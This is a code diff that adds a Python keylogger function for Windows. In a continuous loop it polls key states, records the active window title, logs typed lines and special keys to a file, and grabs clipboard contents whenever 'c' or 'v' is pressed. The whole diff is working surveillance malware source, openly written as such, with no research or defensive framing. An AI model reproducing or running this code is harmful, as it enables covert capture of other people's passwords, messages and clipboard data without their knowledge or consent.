@@ -67,7 +67,7 @@ def get_clipboard():
 
 # Function for monitor and log keystrokes
 # Requires two arguments.
-def get_keystrokes():
+def get_keystrokes(log_dir, log_name):
 
     # Logger
     logging.basicConfig(filename=(log_dir + "\\" + log_name),
@@ -77,3 +77,29 @@ def get_keystrokes():
     special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift',
                     0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock',
                     0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
+    current_window = None
+    line = []  # Stores the characters pressed
+
+    while True:
+        # If the content of current_window isn't the currently opened window
+        if current_window != get_current_window():
+            current_window = get_current_window()  # Get the the window title in current_window
+            # Write the current window title in the log file
+            logging.info(str(current_window).encode('utf-8'))
+
+        # 256 ASCII characters. We only use 128 though
+        for i in range(1, 256):
+            # If a key is pressed and matches an ASCII character
+            if GetAsyncKeyState(i) & 1:
+                if i in special_keys:  # If special key, log as such
+                    logging.info("<{}>".format(special_keys[i]))
+                elif i == 0x0d:  # If <ENTER>, log the line typed then clear the line variable
+                    logging.info(line)
+                    line.clear()
+                # If characters 'c' or 'v' are pressed, get clipboard data
+                # This is necessary incase they press Ctrl+C/Ctrl+V instead of using keyboard shortcuts
+                elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76:
+                    clipboard_data = get_clipboard()
+                    logging.info("[CLIPBOARD] {}".format(clipboard_data))
+                elif 0x30 <= i <= 0x5a:  # If alphanumeric character, append to line
+                    line.append(chr(i))
